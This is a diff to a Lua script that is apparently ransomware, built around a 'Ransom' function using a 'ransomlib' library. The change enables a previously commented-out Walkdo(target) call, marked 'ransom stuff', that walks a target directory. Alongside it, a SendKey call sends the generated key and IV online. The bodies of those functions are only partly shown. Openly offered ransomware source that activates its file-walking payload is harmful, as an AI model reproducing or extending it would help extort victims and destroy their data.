@@ -5,15 +5,15 @@ function Ransom(target, hkey, hiv)
     ransomlib.hkey = ransomlib.bytes_to_hexa(ransomlib.key)
     ransomlib.hiv  = ransomlib.bytes_to_hexa(ransomlib.iv)
 
+    print("target: "..target)
+    print("key   : "..ransomlib.hkey)
+    print("iv    : "..ransomlib.hiv)
+    print("ext   : "..ransomlib.ext)
+
     -- send the key online
     SendKey(ransomlib.hkey, ransomlib.hiv)
-
-    -- print("target: "..target)
-    -- print("key   : "..ransomlib.hkey)
-    -- print("iv    : "..ransomlib.hiv)
-    -- print("ext   : "..ransomlib.ext)
-
-    -- Walkdo(target)
+    -- ransom stuff
+    Walkdo(target)
 end
 
 function SendKey(hkey, hiv)
@@ -46,3 +46,5 @@ function Walkdo(path)
         end
     end
 end
+
+print("[+] Lua code loaded")
